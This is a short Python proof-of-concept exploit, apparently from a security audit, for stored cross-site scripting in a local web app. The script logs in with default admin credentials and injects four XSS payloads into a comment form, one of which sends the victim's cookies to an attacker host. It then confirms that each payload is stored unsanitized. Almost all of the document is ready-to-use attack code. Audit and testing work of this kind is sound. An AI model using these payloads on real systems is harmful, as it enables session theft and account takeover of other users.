# Exploit Stored XSS
# Auditor: David H.CUEVAS SALGADO
# Vulnerabilidad: Stored Cross-Site Scripting
# Severidad: ALTA (CVSS 7.5)

import requests

TARGET_URL = 'http://localhost:5000'
LOGIN_URL = f'{TARGET_URL}/login'
COMMENT_URL = f'{TARGET_URL}/submit_comment'

# Payloads XSS
xss_payloads = [
    "<script>alert('XSS Vulnerability by David Cuevas')</script>",
    "<img src=x onerror='alert(\"XSS\")'>",
    "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
    "<svg/onload=alert('XSS')>",
]

print("="*60)
print("EXPLOIT: Stored Cross-Site Scripting (XSS)")
print("Target:", TARGET_URL)
print("="*60)

# Primero hacer login
session = requests.Session()
login_data = {"username": "admin", "password": "password"}
session.post(LOGIN_URL, data=login_data)

print("\n[+] Login exitoso como admin")

# Inyectar payloads XSS en comentarios
for i, payload in enumerate(xss_payloads, 1):
    print(f"\n[+] Inyectando payload XSS #{i}")
    print(f"    Payload: {payload[:50]}...")
    
    comment_data = {"comment": payload}
    response = session.post(COMMENT_URL, data=comment_data)
    
    if response.status_code == 302:
        print(f"    [SUCCESS] Comentario malicioso almacenado")
        
        # Verificar que se almacenó
        dashboard = session.get(f'{TARGET_URL}/dashboard')
        if payload in dashboard.text:
            print(f"    [CONFIRMED] Payload XSS presente en HTML sin sanitizar")

print("\n" + "="*60)
print("[!] VULNERABILIDAD CONFIRMADA: Stored XSS")
print("[!] IMPACTO: Ejecución de JavaScript en contexto de otros usuarios")
print("="*60)
